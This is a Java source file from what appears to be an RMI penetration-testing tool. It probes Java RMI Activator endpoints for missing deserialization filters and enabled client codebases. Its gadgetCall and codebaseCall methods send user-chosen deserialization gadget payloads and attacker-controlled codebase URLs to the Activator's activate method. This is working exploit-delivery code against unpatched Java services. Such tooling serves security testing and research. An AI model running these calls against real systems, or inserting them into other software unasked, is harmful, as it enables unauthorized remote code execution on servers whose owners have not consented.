package de.qtc.rmg.operations;

import java.rmi.server.ObjID;

import de.qtc.rmg.internal.ExceptionHandler;
import de.qtc.rmg.internal.MethodArguments;
import de.qtc.rmg.internal.RMIComponent;
import de.qtc.rmg.io.Logger;
import de.qtc.rmg.io.MaliciousOutputStream;
import de.qtc.rmg.networking.RMIEndpoint;

/**
 * In the old days, it was pretty common for RMI endpoints to use an Activator. An Activator
 * is basically another well known RemoteObject like the registry or the distributed garbage
 * collector. It's purpose was the activation of RemoteObjects, which were not constantly
 * available, but created on demand. Apart from a remote reference, RMI clients also obtained
 * an ActivationID during the lookup. When the RemoteObject was currently available, it was
 * just used in a regular way. However, when the remote object was not available, clients could
 * contact the Activator specifying their ActivationID. The Activator would then take care
 * of the creation of the RemoteObject.
 *
 * The description above is at least what we could collect from the few available documentation.
 * Activator endpoints are pretty uncommon today, but they are still supported by Java RMI.
 * In 2020, there was a removal request started, but up to now, all the required code is still there.
 *
 * From the offensive point of view, an Activator endpoint is interesting, as it is a well known
 * RemoteObject with publicly known remote methods. Whereas JEP290 introduced serialization filters
 * for the registry and the DGC, the Activator was not patched and still accepts arbitrary Java
 * objects during deserialization. This makes it a valuable target for an attacker.
 *
 * @author Tobias Neitzel (@qtc_de)
 */
public class ActivationClient {

    private RMIEndpoint rmi;

    private static final long methodHash = -8767355154875805558L;
    private static final ObjID objID = new ObjID(ObjID.ACTIVATOR_ID);


    public ActivationClient(RMIEndpoint rmiEndpoint)
    {
        this.rmi = rmiEndpoint;
    }

    /**
     * Checks whether an activator endpoint is present. The Activator has a well known ObjID of 0x01
     * and supports the method activate. This method just invokes the method on the corresponding ObjID.
     * If no Activator is available (which should be the case in 99% of the cases), the RMI endpoint
     * throws an NoSuchObjectException.
     *
     * Since the presence of an Activator endpoint is that rare, it would unnecessary lengthen the output
     * to also create separate checks for deserialization and codebase vulnerabilities. Therefore, both
     * are also included into this function. By default, the activate call is made with in java.util.HashMap
     * instead of the actually expected ActivationID. It is not a full proof, but if this class is not rejected
     * deserialization filters should not be in place. Afterwards, another call is made that contains an invalid
     * URL as codebase for an Integer object. If this causes a malformed URL exception, useCodebaseOnly is false
     * on the server.
     */
    public void enumActivator()
    {
        Logger.printlnBlue("RMI ActivationSystem enumeration:");
        Logger.lineBreak();
        Logger.increaseIndent();

        try {
            activateCall(prepareCallArguments(new java.util.HashMap<String,String>()), false);

        } catch( Exception e ) {

            Throwable t = ExceptionHandler.getCause(e);

            if( t instanceof java.rmi.NoSuchObjectException ) {
                Logger.printMixedYellow("- Caught", "NoSuchObjectException", "during activate call ");
                Logger.printlnPlainYellow("(activator not present).");
                Logger.statusDefault();

            } else if( t instanceof java.lang.IllegalArgumentException ) {
                Logger.printMixedYellow("- Caught", "IllegalArgumentException", "during activate call ");
                Logger.printlnPlainYellow("(activator is present).");
                Logger.printMixedBlue("  --> Deserialization", "allowed");
                Logger.printlnPlainMixedRed("\t - Vulnerability Status:", "Vulnerable");
                this.enumCodebase();

            } else if( t instanceof java.io.InvalidClassException || t instanceof java.lang.UnsupportedOperationException ) {
                Logger.printMixedYellow("- Caught", t.getClass().getName(), "during activate call ");
                Logger.printlnPlainYellow("(activator is present).");
                Logger.printMixedBlue("  --> Deserialization", "filtered");
                Logger.printlnPlainMixedPurple("\t - Vulnerability Status:", "Undecided");
                this.enumCodebase();

            } else {
                ExceptionHandler.unexpectedException(e, "ActivationSystem", "enumeration", false);
            }

        } finally {
            Logger.decreaseIndent();
            MaliciousOutputStream.resetDefaultLocation();
        }
    }

    /**
     * Dispatches an activate call using an Integer instead of the actually expected ActivationID. Furthermore,
     * then Integer is annotated with an invalid URL as codebase String. If the remote server parses the codebase
     * this will lead to a MalformedURLException.
     */
    public void enumCodebase()
    {
        try {
            MaliciousOutputStream.setDefaultLocation("InvalidURL");
            activateCall(prepareCallArguments(0), true);

        } catch( java.rmi.ServerException e ) {

            Throwable t = ExceptionHandler.getCause(e);

            if( t instanceof java.net.MalformedURLException) {
                Logger.printMixedBlue("  --> Client codebase", "enabled");
                Logger.printlnPlainMixedRed("\t - Configuration Status:", "Non Default");
                ExceptionHandler.showStackTrace(e);

            } else if( t instanceof java.io.InvalidClassException || t instanceof java.lang.UnsupportedOperationException ) {
                Logger.printMixedBlue("  --> Client codebase", "filtered");
                Logger.printlnPlainMixedPurple("\t - Configuration Status:", "Undecided");

            } else {
                ExceptionHandler.unexpectedException(e, "codebase", "enumeration", false);
            }

        } catch( java.lang.IllegalArgumentException e ) {
            Logger.printMixedBlue("  --> Client codebase", "disabled");
            Logger.printlnPlainMixedGreen("\t - Configuration Status:", "Current Default");
            ExceptionHandler.showStackTrace(e);

        } catch( Exception e ) {
            ExceptionHandler.unexpectedException(e, "codebase", "enumeration", false);

        } finally {
            Logger.decreaseIndent();
            MaliciousOutputStream.resetDefaultLocation();
        }
    }

    /**
     * Dispatches an activate call using a user specified payload object instead of the expected ActivationID.
     *
     * @param payloadObject object that is used during the activate call
     */
    public void gadgetCall(Object payloadObject)
    {
        Logger.printGadgetCallIntro("Activation");

        try {
            activateCall(prepareCallArguments(payloadObject), false);

        } catch( Exception e ) {
            ExceptionHandler.handleGadgetCallException(e, RMIComponent.ACTIVATOR, "activate");
        }
    }

    /**
     * Dispatches an activate call with an user specified payload object and a user controlled codebase value.
     * The codebase is actually set by the ArgumentParser during the start of the program.
     *
     * @param payloadObject object that is used during the activate call
     */
    public void codebaseCall(Object payloadObject)
    {
        String className = payloadObject.getClass().getName();
        Logger.printCodebaseAttackIntro("Activator", "activate", className);

        try {
            activateCall(prepareCallArguments(payloadObject), true);

        } catch( Exception e) {
            ExceptionHandler.handleCodebaseException(e, className, RMIComponent.ACTIVATOR, "activate");
        }
    }

    /**
     * Helper method to pack the arguments for the activate call. The first parameter of the corresponding remote method
     * is the non primitive and contains the payload object. The second one is a boolean and always contains failse.
     *
     * @param payloadObject payload to use for the first non primitive argument
     * @return MethodArguments object that can be used for the activate call
     */
    private MethodArguments prepareCallArguments(Object payloadObject)
    {
        MethodArguments callArguments = new MethodArguments(2);
        callArguments.add(payloadObject, Object.class);
        callArguments.add(false, boolean.class);
        return callArguments;
    }

    /**
     * Implementation of the activate call. Just uses the genericCall function of the RMIEndpoint class, which allows to perform
     * raw RMI calls. The activator is not implemented as a skeleton and already uses the new calling convention. As it only
     * supports a single method, we can hardcode the methodHash into the class.
     *
     * @param callArguments argument array to use for the call
     * @param maliciousStream whether or not to use MaliciousOutputStream, which activates a custom codebase
     * @throws Exception connection related exceptions are caught, but anything other is thrown
     */
    private void activateCall(MethodArguments callArguments, boolean maliciousStream) throws Exception
    {
        rmi.genericCall(objID, -1, methodHash, callArguments, maliciousStream, "activate");
    }
}
